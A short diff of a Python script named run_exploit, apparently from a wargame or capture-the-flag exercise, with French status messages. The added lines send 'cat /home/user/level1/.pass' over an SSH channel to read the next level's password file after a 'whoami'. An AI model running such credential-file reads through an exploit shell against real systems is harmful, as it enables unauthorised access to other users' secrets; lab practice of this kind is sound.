@@ -26,6 +26,10 @@ def run_exploit():
     chan.send("whoami\n")
     time.sleep(1)
 
+    print("[*] Récupération du mot de passe de level1...")
+    chan.send("cat /home/user/level1/.pass\n")
+    time.sleep(1)
+
     output = chan.recv(4096).decode()
     print("[*] Résultat de 'whoami' :")
     print(output)
